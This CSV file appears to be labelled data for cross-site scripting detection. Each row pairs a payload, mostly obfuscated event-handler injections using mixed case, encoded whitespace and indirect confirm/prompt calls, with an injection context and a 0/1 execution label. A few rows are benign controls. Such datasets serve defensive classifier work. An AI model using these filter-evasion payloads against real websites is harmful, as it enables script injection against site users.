payload,context,exec,combined
<A/+/oNPOiNTERENtER%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A/+/oNPOiNTERENtER%0a=%0aconfirm()>v3dm0s
<A/+/OnpointerenTeR%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <A/+/OnpointerenTeR%0a=%0a(confirm)()>v3dm0s
<dEtaIlS%0aoNTOGgLe+=+confirm()%0dx>,html_text,0,CONTEXT_html_text <dEtaIlS%0aoNTOGgLe+=+confirm()%0dx>
<D3V/+/ONpOiNterentER%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V/+/ONpOiNterentER%09=%09confirm()>v3dm0s
<hTmL%09OnpoInTeReNter%09=%09(prompt)``//,html_text,0,CONTEXT_html_text <hTmL%09OnpoInTeReNter%09=%09(prompt)``//
<html%0dONMOUSEOver%0d=%0d[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <html%0dONMOUSEOver%0d=%0d[8].find(confirm)%0dx>
<d3v/+/ONMousEOver%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v/+/ONMousEOver%09=%09confirm()%0dx>v3dm0s
<a%0aONMOusEoVEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aONMOusEoVEr%0a=%0aconfirm()%0dx>v3dm0s
"<D3v%0doNpoINTerENteR%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <D3v%0doNpoINTerENteR%09=%09a=prompt,a()>v3dm0s"
style=color,html_text,0,CONTEXT_html_text style=color
<DETaILs/+/ONtoGGLE%09=%09(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <DETaILs/+/ONtoGGLE%09=%09(prompt)``%0dx>
<A%09OnpOiNTereNTER%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <A%09OnpOiNTereNTER%09=%09[8].find(confirm)>v3dm0s
<D3V%0dONMOusEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0dONMOusEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s
<HTml/+/oNmOuSeoVEr%09=%09confirm()//,html_tag,0,CONTEXT_html_tag <HTml/+/oNmOuSeoVEr%09=%09confirm()//
<A/+/OnMouSEOVeR+=+[8].find(confirm)>v3dm0s,html_text,0,CONTEXT_html_text <A/+/OnMouSEOVeR+=+[8].find(confirm)>v3dm0s
<A%0aoNmOUseOVEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aoNmOUseOVEr%0d=%0dconfirm()%0dx>v3dm0s
"<DeTails/+/ONtogGlE%0a=%0aa=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <DeTails/+/ONtogGlE%0a=%0aa=prompt,a()%0dx>"
javascript:confirm(1),url_navigation,1,CONTEXT_url_navigation javascript:confirm(1)
<a%09ONmouseOvEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <a%09ONmouseOvEr%0d=%0d[8].find(confirm)>v3dm0s
<D3V%09oNmOUseoVeR%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%09oNmOUseoVeR%0a=%0aconfirm()>v3dm0s
<HTmL%09OnmouSeOVEr+=+[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <HTmL%09OnmouSeOVEr+=+[8].find(confirm)//
<a%09OnMoUSEoVeR%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09OnMoUSEoVeR%09=%09(confirm)()%0dx>v3dm0s
<d3V%09oNMouSeOVeR+=+[8].find(confirm)%0dx>v3dm0s,html_text,0,CONTEXT_html_text <d3V%09oNMouSeOVeR+=+[8].find(confirm)%0dx>v3dm0s
<d3V/+/onMOuSEOvEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/onMOuSEOvEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
<script>alert(1),html_tag,0,CONTEXT_html_tag <script>alert(1)
<D3v%09ONmOUseoveR%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%09ONmOUseoveR%0d=%0d(prompt)``%0dx>v3dm0s
<detAILs%09onpOiNtereNteR%09=%09[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <detAILs%09onpOiNtereNteR%09=%09[8].find(confirm)>
<DeTAiLs%0donTOgGLE%0d=%0dconfirm()//,html_text,0,CONTEXT_html_text <DeTAiLs%0donTOgGLE%0d=%0dconfirm()//
<img src=x onerror=alert&#x28;1&#x29;>,html_text,0,CONTEXT_html_text <img src=x onerror=alert&#x28;1&#x29;>
"<a%09ONmouSEoVER%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%09ONmouSEoVER%0d=%0da=prompt,a()%0dx>v3dm0s"
<DEtAiLS/+/ontOgGLe%0a=%0a(prompt)``>,html_tag,0,CONTEXT_html_tag <DEtAiLS/+/ontOgGLe%0a=%0a(prompt)``>
""" onclick=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onclick=alert(1) """
<d3v%0aonmousEovER%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aonmousEovER%0a=%0a(confirm)()>v3dm0s
<D3V%09OnmOUsEoVEr%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%09OnmOUsEoVEr%09=%09[8].find(confirm)>v3dm0s
<A%09OnMOuSeover%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%09OnMOuSeover%09=%09(confirm)()%0dx>v3dm0s
"<D3v%0doNpoINTerENteR%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3v%0doNpoINTerENteR%09=%09a=prompt,a()>v3dm0s"
<d3v/+/oNmoUsEOVEr%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v/+/oNmoUsEOVEr%0d=%0d(prompt)``%0dx>v3dm0s
<A%0aoNPOINtERenTER%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0aoNPOINtERenTER%0d=%0dconfirm()>v3dm0s
<HTMl%09ONpOinterEntER+=+(confirm)()//,html_tag,0,CONTEXT_html_tag <HTMl%09ONpOinterEntER+=+(confirm)()//
<d3V%0doNmOUsEOVER%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0doNmOUsEOVER%09=%09confirm()>v3dm0s
<d3V%0doNmoUseoVER%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0doNmoUseoVER%0d=%0d(confirm)()%0dx>v3dm0s
<d3v/+/oNMOUsEOVer+=+(confirm)()>v3dm0s,html_text,0,CONTEXT_html_text <d3v/+/oNMOUsEOVer+=+(confirm)()>v3dm0s
<svg/onload=confirm`1`>,html_text,0,CONTEXT_html_text <svg/onload=confirm`1`>
<A%09OnMOuSeover%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09OnMOuSeover%09=%09(confirm)()%0dx>v3dm0s
<DetaiLs%09oNTOGglE+=+confirm()%0dx//,html_text,0,CONTEXT_html_text <DetaiLs%09oNTOGglE+=+confirm()%0dx//
<a%0doNpoinTERenteR%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%0doNpoinTERenteR%0d=%0dconfirm()>v3dm0s
<a%0aOnMOuSEoVEr%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0aOnMOuSEoVEr%0a=%0a(confirm)()%0dx>v3dm0s
<a%0dONmOuSEoVeR%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0dONmOuSEoVeR%09=%09confirm()>v3dm0s
<HTmL%09ONpoinTerentEr+=+confirm()>,html_text,0,CONTEXT_html_text <HTmL%09ONpoinTerentEr+=+confirm()>
"<D3v%09oNpoiNTeReNteR+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CONTEXT_html_text <D3v%09oNpoiNTeReNteR+=+a=prompt,a()%0dx>v3dm0s"
<D3v%0aONmOuSeover%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0aONmOuSeover%0a=%0a(confirm)()%0dx>v3dm0s
<HTmL%09OnPOINTErEnter%09=%09[8].find(confirm)//,html_text,0,CONTEXT_html_text <HTmL%09OnPOINTErEnter%09=%09[8].find(confirm)//
"<DeTaIlS%0doNPOIntErentER%09=%09a=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <DeTaIlS%0doNPOIntErentER%09=%09a=prompt,a()%0dx>"
"<HTML/+/OnPOinTEREnTeR%09=%09a=prompt,a()>",html_text,0,"CONTEXT_html_text <HTML/+/OnPOinTEREnTeR%09=%09a=prompt,a()>"
<D3v%09ONMOUseOver%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%09ONMOUseOver%09=%09[8].find(confirm)%0dx>v3dm0s
<a%0aonpoINTERenteR%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aonpoINTERenteR%09=%09confirm()>v3dm0s
<A%0aoNPOINtERenTER%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aoNPOINtERenTER%0d=%0dconfirm()>v3dm0s
<D3V%0aonmOuseOVeR%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aonmOuseOVeR%09=%09confirm()%0dx>v3dm0s
<d3v/+/oNMOUSEOver%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/oNMOUSEOver%0d=%0dconfirm()%0dx>v3dm0s
<hTmL%09OnMOuSeoVeR+=+(confirm)()%0dx>,html_text,0,CONTEXT_html_text <hTmL%09OnMOuSeoVeR+=+(confirm)()%0dx>
<d3V%0dONpOINteRENTEr+=+confirm()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <d3V%0dONpOINteRENTEr+=+confirm()%0dx>v3dm0s
<A%09onpoInTERENTEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09onpoInTERENTEr%0d=%0dconfirm()%0dx>v3dm0s
<a/+/OnpoinTerENTeR%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a/+/OnpoinTerENTeR%0d=%0dconfirm()>v3dm0s
<d3v/+/ONPoINTereNTer%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v/+/ONPoINTereNTer%09=%09[8].find(confirm)%0dx>v3dm0s
<D3v%0aOnPOinterentER%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aOnPOinterentER%09=%09[8].find(confirm)%0dx>v3dm0s
safeText,html_text,0,CONTEXT_html_text safeText
<D3V%0doNPOiNTeRENteR%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0doNPOiNTeRENteR%0a=%0a(prompt)``%0dx>v3dm0s
%3Cimg%3E,html_text,0,CONTEXT_html_text %3Cimg%3E
<Html%0dOnpoinTEReNtER%09=%09[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <Html%0dOnpoinTEReNtER%09=%09[8].find(confirm)%0dx//
<DEtAilS%0dONToGgLE+=+(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <DEtAilS%0dONToGgLE+=+(confirm)()%0dx//
<D3v/+/OnpoINteRenTer%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v/+/OnpoINteRenTer%09=%09(confirm)()%0dx>v3dm0s
"<D3v%0aOnMoUSEOver%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3v%0aOnMoUSEOver%0a=%0aa=prompt,a()%0dx>v3dm0s"
<d3V/+/OnpointerEnTer%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/OnpointerEnTer%0d=%0d(confirm)()>v3dm0s
<D3v/+/ONpoInteRenteR+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <D3v/+/ONpoInteRenteR+=+confirm()>v3dm0s
<A%09onmOUSEOver+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <A%09onmOUSEOver+=+confirm()%0dx>v3dm0s
<A/+/OnMoUSEOver%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/OnMoUSEOver%09=%09(confirm)()%0dx>v3dm0s
readonly=true,html_text,0,CONTEXT_html_text readonly=true
<d3V/+/oNPoINTerEntER+=+(prompt)``>v3dm0s,html_tag,0,CONTEXT_html_tag <d3V/+/oNPoINTerEntER+=+(prompt)``>v3dm0s
<a%0dONPOINTErentER%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <a%0dONPOINTErentER%09=%09(confirm)()>v3dm0s
<a%09oNmouSeoVEr%0a=%0a(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <a%09oNmouSeoVEr%0a=%0a(prompt)``>v3dm0s
javascript:alert(document.title),url_href,1,CONTEXT_url_href javascript:alert(document.title)
<Html/+/OnpoINterENTEr%0d=%0dconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <Html/+/OnpoINterENTEr%0d=%0dconfirm()%0dx//
"<d3V%0doNmousEOVEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <d3V%0doNmousEOVEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<HTmL%09ONpoinTerentEr+=+confirm()>,html_tag,0,CONTEXT_html_tag <HTmL%09ONpoinTerentEr+=+confirm()>
<HtML%09OnmouseovER%09=%09(confirm)()>,html_tag,0,CONTEXT_html_tag <HtML%09OnmouseovER%09=%09(confirm)()>
<D3v%0dOnpOINterEnTEr%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0dOnpOINterEnTEr%09=%09[8].find(confirm)>v3dm0s
<a/+/ONPoiNtEREnTEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/ONPoiNtEREnTEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
<dETAilS/+/oNtogGLE%09=%09[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <dETAilS/+/oNtogGLE%09=%09[8].find(confirm)%0dx>
"<D3v%0aOnMoUSEOver%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <D3v%0aOnMoUSEOver%0a=%0aa=prompt,a()%0dx>v3dm0s"
<d3v/+/ONmOUSeOVeR%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v/+/ONmOUSeOVeR%0a=%0a(prompt)``%0dx>v3dm0s
<dETAILS%0dontOGGLe%09=%09[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <dETAILS%0dontOGGLe%09=%09[8].find(confirm)%0dx>
<D3v%09onmoUseOVER%0d=%0d(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <D3v%09onmoUseOVER%0d=%0d(confirm)()>v3dm0s
<HTML%09ONMoUSEOVEr+=+[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <HTML%09ONMoUSEOVEr+=+[8].find(confirm)>
<D3V%0aoNmoUSEOveR%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aoNmoUSEOveR%09=%09[8].find(confirm)%0dx>v3dm0s
<body onload=alert(1)>,html_tag,1,CONTEXT_html_tag <body onload=alert(1)>
<detAiLS%0doNPoinTeReNtER%0d=%0d(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <detAiLS%0doNPoinTeReNtER%0d=%0d(confirm)()%0dx//
<hTMl%0aoNpointeREnter+=+[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <hTMl%0aoNpointeREnter+=+[8].find(confirm)//
<A/+/ONmOUseOVEr%0a=%0a(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <A/+/ONmOUseOVEr%0a=%0a(prompt)``>v3dm0s
<A%09OnPoinTEREntER%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%09OnPoinTEREntER%09=%09confirm()>v3dm0s
<detAILS%0aONpOiNteReNTEr%09=%09[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <detAILS%0aONpOiNteReNTEr%09=%09[8].find(confirm)%0dx//
<A%0aONmOUSEOvEr%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <A%0aONmOUSEOvEr%0d=%0d(prompt)``>v3dm0s
<d3V/+/ONPoIntEREntER%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/ONPoIntEREntER%09=%09confirm()%0dx>v3dm0s
javascript:alert(String.fromCharCode(49)),html_text,0,CONTEXT_html_text javascript:alert(String.fromCharCode(49))
<A%0aONmOuseOvEr%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <A%0aONmOuseOvEr%0d=%0d(prompt)``>v3dm0s
<a/+/onMOuSeOVeR%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/onMOuSeOVeR%09=%09confirm()%0dx>v3dm0s
<A/+/OnPOINTeRenTEr%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <A/+/OnPOINTeRenTEr%09=%09(confirm)()>v3dm0s
"<dETaiLS%09ontOGGle+=+a=prompt,a()>",html_text,0,"CONTEXT_html_text <dETaiLS%09ontOGGle+=+a=prompt,a()>"
<hTmL/+/ONpoINTeRENTEr+=+(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <hTmL/+/ONpoINTeRENTEr+=+(confirm)()%0dx>
<Html%0dONmOuSeovER%0d=%0d(confirm)()%0dx//,html_text,0,CONTEXT_html_text <Html%0dONmOuSeovER%0d=%0d(confirm)()%0dx//
<htMl%0aOnpOiNTerENTeR%0a=%0a(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <htMl%0aOnpOiNTerENTeR%0a=%0a(confirm)()%0dx>
<D3V%0donMOuSeOver%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0donMOuSeOver%0d=%0d[8].find(confirm)>v3dm0s
"<A%0aOnmOUseOVEr%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0aOnmOUseOVEr%09=%09a=prompt,a()>v3dm0s"
[test],html_text,0,CONTEXT_html_text [test]
<a%0aoNPOiNTERENTeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aoNPOiNTERENTeR%09=%09[8].find(confirm)%0dx>v3dm0s
<a%0donpoiNtERENTer%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0donpoiNtERENTer%0d=%0d(confirm)()>v3dm0s
"<html%0donpOINteReNTEr%09=%09a=prompt,a()//",html_tag,0,"CONTEXT_html_tag <html%0donpOINteReNTEr%09=%09a=prompt,a()//"
<a/+/oNPOINtEReNtEr%0d=%0d(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <a/+/oNPOINtEReNtEr%0d=%0d(confirm)()>v3dm0s
<A/+/ONPointerenTeR%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/ONPointerenTeR%09=%09(confirm)()%0dx>v3dm0s
<a%09OnmoUsEoVEr%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09OnmoUsEoVEr%09=%09(prompt)``%0dx>v3dm0s
<detaILs%0dontOGgLe+=+(prompt)``>,html_text,0,CONTEXT_html_text <detaILs%0dontOGgLe+=+(prompt)``>
<detAILS%09oNpOinTerenTER%0d=%0d[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <detAILS%09oNpOinTerenTER%0d=%0d[8].find(confirm)//
"<A/+/OnMousEoVeR%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A/+/OnMousEoVeR%09=%09a=prompt,a()%0dx>v3dm0s"
<hTml/+/onMoUseoVER%09=%09(prompt)``%0dx>,html_text,0,CONTEXT_html_text <hTml/+/onMoUseoVER%09=%09(prompt)``%0dx>
<HTmL/+/OnmOuseovEr%09=%09confirm()%0dx//,html_text,0,CONTEXT_html_text <HTmL/+/OnmOuseovEr%09=%09confirm()%0dx//
<DetAils%0aONToGGlE%0a=%0a(prompt)``%0dx>,html_text,0,CONTEXT_html_text <DetAils%0aONToGGlE%0a=%0a(prompt)``%0dx>
<D3v%0dOnPOiNteRenteR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0dOnPOiNteRenteR%09=%09(prompt)``%0dx>v3dm0s
<d3v%0aoNMOuseoVeR%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0aoNMOuseoVeR%0a=%0a[8].find(confirm)%0dx>v3dm0s
<HTMl%0aoNmouseoVer+=+confirm()//,html_text,0,CONTEXT_html_text <HTMl%0aoNmouseoVer+=+confirm()//
<htmL%09onmOuseoveR%0d=%0d[8].find(confirm)//,html_text,0,CONTEXT_html_text <htmL%09onmOuseoveR%0d=%0d[8].find(confirm)//
<ScRiPt>alert(1)</ScRiPt>,html_tag,1,CONTEXT_html_tag <ScRiPt>alert(1)</ScRiPt>
<D3V%09onMoUSeOvER%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%09onMoUSeOvER%0a=%0a(confirm)()>v3dm0s
<D3V/+/onmOUseOVeR%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V/+/onmOUseOVeR%0a=%0a(confirm)()%0dx>v3dm0s
<deTAILS%0dOnPoiNtEReNTEr%0d=%0d(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <deTAILS%0dOnPoiNtEReNTEr%0d=%0d(confirm)()%0dx>
<DETaIls/+/onPOintEreNTeR%0d=%0dconfirm()//,html_text,0,CONTEXT_html_text <DETaIls/+/onPOintEreNTeR%0d=%0dconfirm()//
<D3v%0donMoUSeOVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0donMoUSeOVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<A/+/ONPoINTEreNTeR%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <A/+/ONPoINTEreNTeR%09=%09confirm()>v3dm0s
"<HtmL/+/ONMoUSEOVeR+=+a=prompt,a()>",html_text,0,"CONTEXT_html_text <HtmL/+/ONMoUSEOVeR+=+a=prompt,a()>"
<D3v%0dONmoUsEoVER%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0dONmoUsEoVER%0a=%0aconfirm()>v3dm0s
<D3v%09OnpOiNTerEnTer%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%09OnpOiNTerEnTer%0d=%0d[8].find(confirm)%0dx>v3dm0s
<D3v/+/OnPoINtEreNtEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <D3v/+/OnPoINtEreNtEr%0d=%0d[8].find(confirm)>v3dm0s
<A%09onpointEREnTer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09onpointEREnTer%0d=%0dconfirm()%0dx>v3dm0s
"<D3v%09oNMouSeoVer+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CONTEXT_html_text <D3v%09oNMouSeoVer+=+a=prompt,a()%0dx>v3dm0s"
"<a/+/onMouSEOver%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <a/+/onMouSEOver%0a=%0aa=prompt,a()>v3dm0s"
<D3V%0aOnpOINteRENTeR%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aOnpOINteRENTeR%0a=%0aconfirm()>v3dm0s
<img src=x onerror=alert&#x28;1&#x29;>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert&#x28;1&#x29;>
<A%09ONpoINteRENtER%0a=%0a(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <A%09ONpoINteRENtER%0a=%0a(prompt)``>v3dm0s
<DetAIlS/+/onPOINTereNter%09=%09[8].find(confirm)%0dx//,url_href,0,CONTEXT_url_href <DetAIlS/+/onPOINTereNter%09=%09[8].find(confirm)%0dx//
<A%0dONMouSeOVer%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0dONMouSeOVer%0a=%0a[8].find(confirm)>v3dm0s
<D3v%0aOnpoiNTerENTer%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0aOnpoiNTerENTer%0d=%0d(confirm)()%0dx>v3dm0s
"<dEtAIls%0doNPoiNteRenTEr+=+a=prompt,a()>",html_tag,0,"CONTEXT_html_tag <dEtAIls%0doNPoiNteRenTEr+=+a=prompt,a()>"
<D3V%0dONmOUseoVer+=+(confirm)()>v3dm0s,html_tag,0,CONTEXT_html_tag <D3V%0dONmOUseoVer+=+(confirm)()>v3dm0s
<script>this.alert(1)</script>,html_tag,1,CONTEXT_html_tag <script>this.alert(1)</script>
<D3v%0aOnPoINtEReNTER%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aOnPoINtEReNTER%0d=%0d(prompt)``%0dx>v3dm0s
"<d3V%09oNpoInTereNter%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <d3V%09oNpoInTereNter%09=%09a=prompt,a()%0dx>v3dm0s"
"<htML%0dONpOinTeREnTER%0d=%0da=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <htML%0dONpOinTeREnTER%0d=%0da=prompt,a()%0dx>"
<d3V%0aonpoINTeRENTER%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0aonpoINTeRENTER%0a=%0a(confirm)()>v3dm0s
"<A%09OnMoUsEoVeR%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%09OnMoUsEoVeR%0d=%0da=prompt,a()>v3dm0s"
<DeTAilS%0dOnPoiNTERENtER+=+(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <DeTAilS%0dOnPoiNTERENtER+=+(confirm)()%0dx>
"<D3V%0aONmouseovER%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <D3V%0aONmouseovER%0d=%0da=prompt,a()%0dx>v3dm0s"
"<DeTails/+/ONtogGlE%0a=%0aa=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <DeTails/+/ONtogGlE%0a=%0aa=prompt,a()%0dx>"
<A%0dONMOuseovER%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0dONMOuseovER%0a=%0aconfirm()>v3dm0s
<a%09onpOiNTeRenTeR%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09onpOiNTeRenTeR%0a=%0aconfirm()%0dx>v3dm0s
<Html%09oNmoUSeOver%0d=%0d(prompt)``%0dx//,html_text,0,CONTEXT_html_text <Html%09oNmoUSeOver%0d=%0d(prompt)``%0dx//
<a%0aONpoIntERenteR%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aONpoIntERenteR%0d=%0d(confirm)()%0dx>v3dm0s
